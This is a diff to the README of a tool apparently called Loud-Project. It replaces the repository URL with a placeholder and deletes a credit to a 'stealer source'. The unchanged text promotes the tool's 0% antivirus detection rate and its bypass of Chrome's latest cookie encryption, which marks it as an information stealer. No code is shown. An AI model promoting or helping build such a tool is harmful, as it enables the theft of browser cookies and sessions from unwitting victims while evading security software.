@@ -58,9 +58,9 @@ To install all dependencies, simply run the following:
 ## How to Run 🖥️
 
 1. **Clone the repository**:
-   `git clone https://github.com/wompless/Loud-Project.git`
+   `git clone https://github.com/YourRepository/YourProject.git`
 
-   `cd Loud-Project`
+   `cd YourProject`
 
 2. **Install dependencies**:
    After ensuring that you have Python, Node.js, and Visual Studio installed, run the following to install all necessary Node.js modules:
@@ -72,23 +72,6 @@ To install all dependencies, simply run the following:
      `npm start`
 
 4. The application will open a GUI built with **Electron**, where you can interact with the tool.
-   
-
-## Mentions ✨
-
-I would like to give special thanks to the following individuals who have greatly contributed to the development of this project:
-
-- **Kisakay**: [GitHub Profile](https://github.com/Kisakay)
-- **TanevAZ**: [GitHub Profile](https://github.com/TanevAZ)
-- **VInzui**: [GitHub Profile](https://github.com/Vinzui)
-
-Additionally, a shoutout to **Wave** for the stealer source that helped in shaping this project.
-
-## Contact 📱
-
-If you have any questions, concerns, or abuse reports, please contact us via Telegram:
-[Telegram: @LoudProject](https://t.me/LoudProject)
-
 
 ## Why Bun is Incredible 🏎️
 
@@ -99,6 +82,12 @@ With **Bun**, the detection rate of the compiled executable is **0%**, making it
 In contrast, using **pkg** for compiling results in a **2% detection rate**, but still provides a fast and effective solution for bundling the application into an executable file.
 
 **Bun** optimizes the encryption bypass process, particularly in dealing with Chrome’s **latest cookie encryption**, which was previously a challenge to overcome. By leveraging Bun's efficiency, we are able to execute decryption tasks with **minimal overhead**.
+
+## Contact 📱
+
+If you have any questions, concerns, or abuse reports, please contact us via Telegram:
+
+[Telegram: @LoudProject](https://t.me/LoudProject)
 
 ---
 
